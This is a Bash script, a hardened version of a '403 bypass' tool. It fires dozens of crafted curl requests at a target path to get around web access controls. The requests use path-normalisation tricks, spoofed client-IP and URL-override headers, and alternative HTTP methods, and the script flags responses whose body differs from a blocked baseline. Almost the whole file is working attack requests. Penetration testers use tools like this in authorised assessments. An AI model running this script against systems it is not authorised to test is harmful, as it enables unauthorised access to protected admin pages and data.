#!/usr/bin/env bash
# bypass-403 v2 — fixed & hardened
# Usage: ./bypass403.sh https://target.com admin [--ip 127.0.0.1] [--no-color]
# Fixes vs iamj0ker/bypass-403:
#   1. --path-as-is everywhere (curl was normalizing ../ and // away)
#   2. X-Custom-IP-Authorization: real IP (was hardcoded "***")
#   3. X-Original-URL / X-Rewrite-URL include leading slash
#   4. line-52 leading-space bug removed
#   5. no -L (report the DIRECT response, don't mask via redirects)
#   6. body-size diff vs baseline => real bypass detection, not just codes
#   7. expanded header list (X-Real-IP, X-Client-IP, X-HTTP-Method-Override, ...)
#   8. graceful errors, optional figlet, wayback guard

set -uo pipefail

URL="${1:-}"; PATHX="${2:-}"
IP="127.0.0.1"; COLOR=1
shift 2 2>/dev/null || true
while [ $# -gt 0 ]; do
  case "$1" in
    --ip) IP="$2"; shift 2;;
    --no-color) COLOR=0; shift;;
    *) shift;;
  esac
done

[ -z "$URL" ] || [ -z "$PATHX" ] && { echo "Usage: $0 <url> <path> [--ip 127.0.0.1] [--no-color]"; exit 1; }
URL="${URL%/}"

if [ "$COLOR" = 1 ]; then
  G=$'\e[32m'; Y=$'\e[33m'; R=$'\e[31m'; C=$'\e[36m'; B=$'\e[1m'; N=$'\e[0m'
else
  G=""; Y=""; R=""; C=""; B=""; N=""
fi

command -v figlet >/dev/null && figlet Bypass-403 2>/dev/null
echo "${B}bypass-403 v2${N}  target=${C}${URL}${N}  path=${C}${PATHX}${N}  ip=${C}${IP}${N}"
echo "--------------------------------------------------------------------------"

# --- baseline -------------------------------------------------------------
BASE=$(curl -k -s --path-as-is -o /tmp/.b403_body -w "%{http_code}:%{size_download}" "$URL/$PATHX")
BASE_CODE="${BASE%%:*}"; BASE_SIZE="${BASE##*:}"
echo "${B}baseline:${N} $BASE_CODE ($BASE_SIZE bytes)  ->  $URL/$PATHX"
[ "$BASE_CODE" = "000" ] && { echo "${R}target unreachable${N}"; exit 2; }
cp /tmp/.b403_body /tmp/.b403_base 2>/dev/null
echo

probe() {
  # $1 = label, rest = curl args. Path appended via $URL/$PATHX convention is caller's job.
  local label="$1"; shift
  local out code size
  out=$(curl -k -s --path-as-is -o /tmp/.b403_p -w "%{http_code}:%{size_download}" "$@")
  code="${out%%:*}"; size="${out##*:}"
  local mark="${N} " note=""
  if [ "$code" = "$BASE_CODE" ] && [ "$size" = "$BASE_SIZE" ]; then
    mark="${N}="; note="${Y}(same as baseline)${N}"
  elif [[ "$code" =~ ^2 ]]; then
    # 2xx -> possible bypass; verify body actually differs
    if ! cmp -s /tmp/.b403_p /tmp/.b403_base; then
      mark="${G}*"; note="${G}<<< POSSIBLE BYPASS (2xx, different body)${N}"
    else
      mark="${N}="; note="${Y}(2xx but identical body)${N}"
    fi
  elif [ "$code" = "000" ]; then
    mark="${R}!"; note="${R}(request failed)${N}"
  else
    mark="${N} "
  fi
  printf "  %s%-3s${N} %-42s %s %s\n" "$mark" "$code" "$label" "$note" ""
}

echo "${B}[ path tricks ]${N}"
probe "$PATHX/"                     "$URL/$PATHX/"
probe "$PATHX/."                    "$URL/$PATHX/."
probe "$PATHX//"                    "$URL/$PATHX//"
probe "//$PATHX//"                  "$URL//$PATHX//"
probe "/./$PATHX/./"                "$URL/./$PATHX/./"
probe "%2e/$PATHX"                  "$URL/%2e/$PATHX"
probe "$PATHX/..;/"                 "$URL/$PATHX/..;/"
probe "$PATHX%20"                   "$URL/$PATHX%20"
probe "$PATHX%09"                   "$URL/$PATHX%09"
probe "$PATHX?"                     "$URL/$PATHX?"
probe "$PATHX.html"                 "$URL/$PATHX.html"
probe "$PATHX.json"                 "$URL/$PATHX.json"
probe "$PATHX.php"                  "$URL/$PATHX.php"
probe "$PATHX/*"                    "$URL/$PATHX/*"
probe "$PATHX;/"                    "$URL/$PATHX;/"
probe "$PATHX%2f"                   "$URL/$PATHX%2f"
probe "$PATHX/"                     "$URL/$PATHX/..;/"

echo
echo "${B}[ header tricks ]${N}"
H_ORIG="/$PATHX"
probe "X-Original-URL: $H_ORIG"     -H "X-Original-URL: $H_ORIG"              "$URL/$PATHX"
probe "X-Rewrite-URL: $H_ORIG"      -H "X-Rewrite-URL: $H_ORIG"               "$URL/$PATHX"
probe "X-Override-URL: $H_ORIG"     -H "X-Override-URL: $H_ORIG"              "$URL/$PATHX"
probe "X-Custom-IP-Authorization: $IP" -H "X-Custom-IP-Authorization: $IP"    "$URL/$PATHX"
probe "X-Forwarded-For: $IP"        -H "X-Forwarded-For: $IP"                 "$URL/$PATHX"
probe "X-Forwarded-For: $IP:80"     -H "X-Forwarded-For: $IP:80"              "$URL/$PATHX"
probe "X-Forwarded-For: localhost"  -H "X-Forwarded-For: localhost"           "$URL/$PATHX"
probe "X-Real-IP: $IP"              -H "X-Real-IP: $IP"                       "$URL/$PATHX"
probe "X-Client-IP: $IP"            -H "X-Client-IP: $IP"                     "$URL/$PATHX"
probe "X-Originating-IP: $IP"       -H "X-Originating-IP: $IP"                "$URL/$PATHX"
probe "X-Remote-IP: $IP"            -H "X-Remote-IP: $IP"                     "$URL/$PATHX"
probe "X-Remote-Addr: $IP"          -H "X-Remote-Addr: $IP"                   "$URL/$PATHX"
probe "X-Host: $IP"                 -H "X-Host: $IP"                          "$URL/$PATHX"
probe "X-Forwarded-Host: $IP"       -H "X-Forwarded-Host: $IP"                "$URL/$PATHX"
probe "X-Forwarded-Server: $IP"     -H "X-Forwarded-Server: $IP"              "$URL/$PATHX"
probe "X-HTTP-Method-Override: PUT" -H "X-HTTP-Method-Override: PUT"          "$URL/$PATHX"
probe "Referer: $URL/$PATHX"        -H "Referer: $URL/$PATHX"                 "$URL/$PATHX"
probe "X-Original-URL (no path)"    -H "X-Original-URL: $H_ORIG"              "$URL/"

echo
echo "${B}[ method tricks ]${N}"
probe "POST (Content-Length: 0)"    -X POST -H "Content-Length: 0"            "$URL/$PATHX"
probe "PUT"                         -X PUT                                  "$URL/$PATHX"
probe "PATCH"                       -X PATCH                                "$URL/$PATHX"
probe "TRACE"                       -X TRACE                                "$URL/$PATHX"
probe "OPTIONS"                     -X OPTIONS                              "$URL/$PATHX"

echo
echo "${B}[ wayback ]${N}"
WB=$(curl -s --max-time 10 "https://archive.org/wayback/available?url=${URL#*://}/$PATHX" 2>/dev/null)
if command -v jq >/dev/null && echo "$WB" | jq -e . >/dev/null 2>&1; then
  echo "$WB" | jq -r '.archived_snapshots.closest | "  available=\(.available)  \(.url // "none")"'
else
  echo "  ${Y}wayback lookup unavailable${N}"
fi

echo
echo "${G}${B}Done.${N} Lines marked ${G}*${N} = possible bypass, verify manually."
